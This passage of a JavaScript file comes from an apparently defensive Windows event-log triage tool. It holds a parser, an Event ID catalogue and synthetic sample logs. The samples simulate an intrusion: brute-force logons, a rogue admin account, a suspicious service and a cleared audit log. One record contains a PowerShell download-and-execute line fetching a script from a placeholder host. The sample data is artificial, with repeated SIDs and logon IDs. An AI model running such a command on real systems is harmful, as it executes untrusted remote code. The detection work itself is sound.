ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\trjones\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Windows\\System32\\mmc.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Windows\\System32\\mmc.exe\"\" \"\"C:\\Windows\\System32\\services.msc\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\n",
  "account-persistence.csv": "Level,Date and Time,Source,Event ID,Task Category,User,Computer,Keywords,Message\r\nInformation,14/10/2026 09:00:05,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\Administrator,SRV-FILE-01,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-IT-002$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tAdministrator\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\lsass.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-IT-002\n\tSource Network Address:\t10.20.0.10\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 09:03:11,Microsoft-Windows-Security-Auditing,4720,User Account Management,CORP\\Administrator,SRV-FILE-01,,\"A user account was created.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-500\n\tAccount Name:\t\tAdministrator\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nNew Account:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1188\n\tAccount Name:\t\tsvc_backup2\n\tAccount Domain:\t\tCORP\n\nAttributes:\n\tSAM Account Name:\tsvc_backup2\n\tDisplay Name:\t\tsvc_backup2\n\tUser Principal Name:\tsvc_backup2@corp.example\n\tPrimary Group ID:\t513\n\tPassword Last Set:\t14/10/2026 09:20:11\n\nAdditional Information:\n\tPrivileges:\t\t-\"\r\nInformation,14/10/2026 09:03:29,Microsoft-Windows-Security-Auditing,4732,Security Group Management,CORP\\Administrator,SRV-FILE-01,,\"A member was added to a security-enabled local group.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-500\n\tAccount Name:\t\tAdministrator\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nMember:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1188\n\tAccount Name:\t\tsvc_backup2\n\tAccount Domain:\t\tCORP\n\nGroup:\n\tSecurity ID:\t\tS-1-5-32-544\n\tGroup Name:\t\tAdministrators\n\tGroup Domain:\t\tBUILTIN\n\nAdditional Information:\n\tPrivileges:\t\t-\"\r\nInformation,14/10/2026 09:05:02,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\Administrator,SRV-FILE-01,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tAdministrator\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Windows\\System32\\cmd.exe\"\" /c whoami\n\nToken Elevation Type:\t\t%%1936\"\r\nInformation,14/10/2026 09:40:18,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\apatel,WS-HR-007,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-HR-007$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tapatel\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-HR-007\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 10:12:00,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\jsmith,WS-FIN-014,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-FIN-014$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-FIN-014\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 11:20:41,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\jsmith,WS-FIN-014,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Windows\\System32\\calc.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Windows\\System32\\calc.exe\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\n",
  "suspicious-admin-activity.csv": "Level,Date and Time,Source,Event ID,Task Category,User,Computer,Keywords,Message\r\nInformation,14/10/2026 07:45:00,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\apatel,WS-HR-007,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-HR-007$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tapatel\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-HR-007\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 07:45:22,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\apatel,WS-HR-007,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tapatel\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\nAudit Failure,14/10/2026 09:11:02,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\svc_backup,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tsvc_backup\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t203.0.113.45\n\tSource Port:\t\t49857\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 09:11:06,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\svc_backup,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tsvc_backup\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t203.0.113.45\n\tSource Port:\t\t49857\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 09:11:11,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\svc_backup,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tsvc_backup\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t203.0.113.45\n\tSource Port:\t\t49857\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 09:11:17,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\svc_backup,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tsvc_backup\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t203.0.113.45\n\tSource Port:\t\t49857\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 09:11:24,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\svc_backup,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tsvc_backup\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t203.0.113.45\n\tSource Port:\t\t49857\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nAudit Failure,14/10/2026 09:11:32,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\\svc_backup,SRV-FILE-01,,\"An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tsvc_backup\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nProcess Information:\n\tCaller Process ID:\t0x0\n\tCaller Process Name:\t-\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t203.0.113.45\n\tSource Port:\t\t49857\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp \n\tAuthentication Package:\tNTLM\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 09:11:49,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\svc_backup,SRV-FILE-01,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tKALI-LAB$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tsvc_backup\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\lsass.exe\n\nNetwork Information:\n\tWorkstation Name:\tKALI-LAB\n\tSource Network Address:\t203.0.113.45\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 09:14:03,Microsoft-Windows-Security-Auditing,4720,User Account Management,CORP\\Administrator,SRV-FILE-01,,\"A user account was created.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-500\n\tAccount Name:\t\tAdministrator\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nNew Account:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1188\n\tAccount Name:\t\thelpdesk_tmp\n\tAccount Domain:\t\tCORP\n\nAttributes:\n\tSAM Account Name:\thelpdesk_tmp\n\tDisplay Name:\t\thelpdesk_tmp\n\tUser Principal Name:\thelpdesk_tmp@corp.example\n\tPrimary Group ID:\t513\n\tPassword Last Set:\t14/10/2026 09:20:11\n\nAdditional Information:\n\tPrivileges:\t\t-\"\r\nInformation,14/10/2026 09:14:20,Microsoft-Windows-Security-Auditing,4732,Security Group Management,CORP\\Administrator,SRV-FILE-01,,\"A member was added to a security-enabled local group.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-500\n\tAccount Name:\t\tAdministrator\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nMember:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1188\n\tAccount Name:\t\thelpdesk_tmp\n\tAccount Domain:\t\tCORP\n\nGroup:\n\tSecurity ID:\t\tS-1-5-32-544\n\tGroup Name:\t\tAdministrators\n\tGroup Domain:\t\tBUILTIN\n\nAdditional Information:\n\tPrivileges:\t\t-\"\r\nInformation,14/10/2026 09:16:40,Microsoft-Windows-Security-Auditing,4728,Security Group Management,CORP\\Administrator,SRV-FILE-01,,\"A member was added to a security-enabled global group.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-500\n\tAccount Name:\t\tAdministrator\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nMember:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1188\n\tAccount Name:\t\thelpdesk_tmp\n\tAccount Domain:\t\tCORP\n\nGroup:\n\tSecurity ID:\t\tS-1-5-32-544\n\tGroup Name:\t\tDomain Admins\n\tGroup Domain:\t\tCORP\n\nAdditional Information:\n\tPrivileges:\t\t-\"\r\nInformation,14/10/2026 09:18:55,Service Control Manager,7045,None,SYSTEM,SRV-FILE-01,,\"A service was installed in the system.\n\nService Name:\tRemoteUpdater\nService File Name:\tC:\\Users\\Public\\updater.exe\nService Type:\tuser mode service\nService Start Type:\tauto start\nService Account:\tLocalSystem\"\r\nInformation,14/10/2026 09:19:31,Microsoft-Windows-PowerShell,4104,Execute a Remote Command,CORP\\Administrator,SRV-FILE-01,,\"Creating Scriptblock text (1 of 1):\n$c = 'aHR0cDovL2V4YW1wbGUuaW52YWxpZC9wYXlsb2FkLmJpbg=='; IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/p.ps1')\n\nScriptBlock ID: 8f2c1a44-3b1e-4c7a-9a11-5d2e6f7a8b90\nPath:\"\r\nInformation,14/10/2026 09:20:02,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\Administrator,SRV-FILE-01,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tAdministrator\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Users\\Public\\updater.exe\n\tProcess Command Line:\t\"\"C:\\Windows\\System32\\cmd.exe\"\" /c net localgroup administrators\n\nToken Elevation Type:\t\t%%1936\"\r\nInformation,14/10/2026 09:26:14,Microsoft-Windows-Security-Auditing,1102,Audit Log Cleared,CORP\\Administrator,SRV-FILE-01,,\"The audit log was cleared.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-500\n\tAccount Name:\t\tAdministrator\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\"\r\nInformation,14/10/2026 10:02:11,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\jsmith,WS-FIN-014,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-FIN-014$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-FIN-014\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\nInformation,14/10/2026 10:02:35,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\\jsmith,WS-FIN-014,,\"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tNew Process ID:\t\t0x1f4\n\tNew Process Name:\tC:\\Windows\\System32\\notepad.exe\n\tCreator Process ID:\t0x2f0\n\tCreator Process Name:\tC:\\Windows\\explorer.exe\n\tProcess Command Line:\t\"\"C:\\Windows\\System32\\notepad.exe\"\"\n\nToken Elevation Type:\t\t%%1936\"\r\nInformation,14/10/2026 13:44:50,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\\rjones,WS-IT-002,,\"An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tWS-IT-002$\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x3E7\n\nLogon Information:\n\tLogon Type:\t\t2\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\n\tAccount Name:\t\trjones\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0x1A2B3C4D\n\nProcess Information:\n\tProcess ID:\t\t0x2f0\n\tProcess Name:\t\tC:\\Windows\\System32\\winlogon.exe\n\nNetwork Information:\n\tWorkstation Name:\tWS-IT-002\n\tSource Network Address:\t127.0.0.1\n\tSource Port:\t\t0\n\nDetailed Authentication Information:\n\tLogon Process:\t\tUser32 \n\tAuthentication Package:\tNegotiate\n\tKey Length:\t\t0\"\r\n"
};

  /* ---------------------------------------------------------------------
     2. Windows Event ID catalogue.
     Only the Event IDs this tool understands. Anything else is still
     counted, but shown as "Unrecognised Event ID" and never flagged.
     --------------------------------------------------------------------- */
  var CAT_INFORMATIONAL = 'Informational';
  var CAT_LOW = 'Low';
  var CAT_MEDIUM = 'Medium';
  var CAT_HIGH = 'High';

  var EVENT_CATALOG = {
    4624: {
      name: 'Successful Logon', category: 'Authentication', severity: CAT_INFORMATIONAL,
      plain: 'An account successfully logged on. Extremely common. Its value is as context: when it follows a burst of failed logons for the same account, it becomes interesting.'
    },
    4625: {
      name: 'Failed Logon', category: 'Authentication', severity: CAT_LOW,
      plain: 'A logon attempt failed. A single failure is usually a typo. Many failures for one account in a short time deserve a look.'
    },
    4634: {
      name: 'Logoff', category: 'Authentication', severity: CAT_INFORMATIONAL,
      plain: 'An account logged off. Useful mainly for pairing sessions with their logon events.'
    },
    4688: {
      name: 'Process Created', category: 'Process', severity: CAT_INFORMATIONAL,
      plain: 'A new process started. Process creation auditing must be enabled for these to appear. Useful context (what ran, and what started it) rather than a detection on its own.'
    },
    4720: {
      name: 'User Account Created', category: 'Account management', severity: CAT_MEDIUM,
      plain: 'A new local or domain user account was created. Often routine (new starters, service accounts), but should be verifiable against a change record.'
    },
    4726: {
      name: 'User Account Deleted', category: 'Account management', severity: CAT_LOW,
      plain: 'A user account was deleted. Usually administration, occasionally part of covering tracks or account manipulation.'
    },
    4728: {
      name: 'Member Added to Global Security Group', category: 'Privilege', severity: CAT_MEDIUM,
      plain: 'An account was added to a global (typically Active Directory) security group. Priority rises sharply if the group is a privileged one such as Domain Admins.'
    },
    4732: {
      name: 'Member Added to Local Security Group', category: 'Privilege', severity: CAT_MEDIUM,
      plain: 'An account was added to a local security group. Priority rises sharply if the group is Administrators or another privileged group.'
    },
    1102: {
      name: 'Security Audit Log Cleared', category: 'Audit log', severity: CAT_HIGH,
      plain: 'The Windows Security audit log was cleared. This does happen during legitimate maintenance, but because attackers clear logs to remove evidence it should normally be investigated.'
    },
    4104: {
      name: 'PowerShell Script Block Logging', category: 'PowerShell', severity: CAT_INFORMATIONAL,
      plain: 'PowerShell script block logging recorded the text of a script or command. PowerShell itself is not suspicious; the content of the script block is what matters. Script block logging must be enabled in advance.'
    },
    7045: {
      name: 'Service Installed', category: 'Service', severity: CAT_LOW,
      plain: 'A new Windows service was installed. Often legitimate software installation; also a well-known way to establish persistence.'
    }
  };

  /* Groups that make a privilege change more significant. */
  var PRIVILEGED_GROUPS = [
    'administrators', 'domain admins', 'enterprise admins', 'schema admins',
    'backup operators', 'account operators', 'server operators', 'print operators',
    'remote desktop users', 'hyper-v administrators', 'group policy creator owners',
    'dnsadmins', 'exchange organization administrators', 'protected users'
  ];

  /* ---------------------------------------------------------------------
     3. Defaults and small helpers
     --------------------------------------------------------------------- */
  var DEFAULT_SETTINGS = {
    failedLoginThreshold: 5,
    failedLoginWindowMinutes: 10,
    privilegeChangeThreshold: 1
  };

  var SEVERITY_ORDER = { Informational: 0, Low: 1, Medium: 2, High: 3 };
  var MAX_ROWS_PER_PAGE = 100;

  /* Create an element. Text is always set with textContent so values taken
     from the uploaded CSV can never be interpreted as HTML or JavaScript. */
  function el(tag, props, children) {
    var node = document.createElement(tag);
    if (props) {
      Object.keys(props).forEach(function (key) {
        var value = props[key];
        if (value === null || value === undefined) return;
        if (key === 'class') node.className = value;
        else if (key === 'text') node.textContent = String(value);
        else if (key === 'children') appendAll(node, value);
        else if (key.indexOf('on') === 0 && typeof value === 'function') {
          node.addEventListener(key.slice(2), value);
        } else node.setAttribute(key, value);
      });
    }
    if (children) appendAll(node, children);
    return node;
  }
  function appendAll(parent, children) {
    (Array.isArray(children) ? children : [children]).forEach(function (child) {
      if (child) parent.appendChild(child);
    });
    return parent;
  }
  function clear(node) { while (node.firstChild) node.removeChild(node.firstChild); }
  function $(id) { return document.getElementById(id); }
  function nf(n) { return (n === null || n === undefined || isNaN(n)) ? '—' : String(n); }
  function plural(n, one, many) { return n + ' ' + (n === 1 ? one : many); }

  /* ---------------------------------------------------------------------
     4. CSV parser.
     Character-by-character so that quoted fields containing commas, double
     quotes and line breaks are handled correctly — Windows Event Viewer
     message text contains all three.
     --------------------------------------------------------------------- */
  function parseCSV(text) {
    if (typeof text !== 'string') return [];
    if (text.charCodeAt(0) === 0xFEFF) text = text.slice(1);      /* strip BOM */

    var rows = [];
    var row = [];
    var field = '';
    var inQuotes = false;
    var i = 0;

    while (i < text.length) {
      var ch = text[i];

      if (inQuotes) {
        if (ch === '"') {
          if (text[i + 1] === '"') { field += '"'; i += 2; continue; }
          inQuotes = false; i += 1; continue;
        }
        field += ch; i += 1; continue;
      }

      if (ch === '"') { inQuotes = true; i += 1; continue; }
      if (ch === ',') { row.push(field); field = ''; i += 1; continue; }
      if (ch === '\r') { i += 1; continue; }
      if (ch === '\n') {
        row.push(field); field = '';
        rows.push(row); row = [];
        i += 1; continue;
      }
      field += ch; i += 1;
    }
    /* last field / row (file may not end with a newline) */
    if (field !== '' || row.length > 0) { row.push(field); rows.push(row); }

    /* drop fully empty rows */
    return rows.filter(function (r) {
      return r.some(function (c) { return String(c).trim() !== ''; });
    });
  }

  /* ---------------------------------------------------------------------
     5. Column detection.
     Header names vary between Windows versions, tools and locales, so we
     normalise them (lowercase, strip everything except letters and digits)
     and match against a list of accepted aliases.
     --------------------------------------------------------------------- */
  var COLUMN_ALIASES = {
    eventId:  ['eventid', 'eventcode', 'eventnumber', 'id', 'event'],
    time:     ['dateandtime', 'timecreated', 'datetime', 'timestamp', 'date', 'time', 'logged'],
    account:  ['user', 'accountname', 'username', 'account', 'targetusername', 'subjectusername', 'userid'],
    level:    ['level', 'leveldisplayname', 'levelname', 'severity', 'type', 'eventlevel'],
    source:   ['source', 'providername', 'sourcename', 'provider', 'sourcemodule'],
    computer: ['computer', 'computername', 'hostname', 'host', 'machine', 'node'],
    message:  ['message', 'description', 'details', 'eventdata']
  };

  function normaliseHeader(value) {
    return String(value == null ? '' : value).toLowerCase().replace(/[^a-z0-9]/g, '');
  }

  function detectColumns(headerRow) {
    var map = {};
    var found = {};
    headerRow.forEach(function (raw, index) {
      var norm = normaliseHeader(raw);
      if (!norm) return;
      Object.keys(COLUMN_ALIASES).forEach(function (field) {
        if (map[field] !== undefined) return;
        if (COLUMN_ALIASES[field].indexOf(norm) !== -1) {
          map[field] = index;
          found[field] = String(raw).replace(/^"|"$/g, '').trim();
        }
      });
    });
    return { map: map, found: found };
  }

  /* Locate the header row. Some exports place a title or blank line first,
     so we look for the first row that contains a recognisable Event ID
